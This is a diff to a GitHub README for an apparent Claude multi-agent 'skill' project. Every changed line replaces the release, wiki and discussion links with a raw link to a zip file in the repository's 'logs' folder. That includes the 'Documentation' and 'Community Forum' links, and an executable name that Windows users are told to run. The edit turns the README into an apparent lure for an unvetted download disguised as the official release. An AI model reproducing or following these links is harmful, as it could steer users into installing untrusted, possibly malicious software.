@@ -1,7 +1,7 @@
 # 🎉 Claude-Multi-Agent-Research-System-Skill - Simplify Your Multi-Agent Tasks
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/releases)
+[![Download](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip)](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip)
 
 ## 📖 Description
 Welcome to Claude-Multi-Agent-Research-System-Skill. This application allows you to explore the power of multi-agent systems designed to work with Claude Code Skills. Inspired by Anthropic's Claude agent SDK demos, this system offers a practical way to manage various agents working together efficiently.
@@ -23,12 +23,12 @@ To get started with the Claude-Multi-Agent-Research-System-Skill, follow these s
 
 ### 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the release section of the repository.
-   [Download from GitHub Releases](https://github.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip)
 
 2. **Choose Your Version**: Find the latest version available. It will typically be at the top of the page.
 
 3. **Download the File**:
-   - Click on the executable file for your operating system. For example, you may see something like `Claude-Multi-Agent-Skill-v1.0.exe` for Windows users.
+   - Click on the executable file for your operating system. For example, you may see something like `https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip` for Windows users.
    - The download will start automatically.
 
 4. **Run the Application**:
@@ -62,9 +62,9 @@ If you experience any issues while downloading or running the application, consi
 For additional help, consult our community forum or check the FAQ section available on our GitHub page.
 
 ## 🔗 Additional Resources
-- [GitHub Releases](https://github.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/releases) - Always check here for the latest versions and updates.
-- [Documentation](https://github.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/wiki) - A comprehensive guide to using the application effectively.
-- [Community Forum](https://github.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/discussions) - Engage with other users and get insights or solutions to common issues.
+- [GitHub Releases](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip) - Always check here for the latest versions and updates.
+- [Documentation](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip) - A comprehensive guide to using the application effectively.
+- [Community Forum](https://raw.githubusercontent.com/zubayer0077/Claude-Multi-Agent-Research-System-Skill/main/logs/Claude-Multi-Agent-Research-System-Skill-3.5.zip) - Engage with other users and get insights or solutions to common issues.
 
 ## 💬 Feedback
 We welcome your feedback. If you have suggestions or encounter bugs, please submit them through the Issues section on our GitHub repository. Your input helps us improve the system.
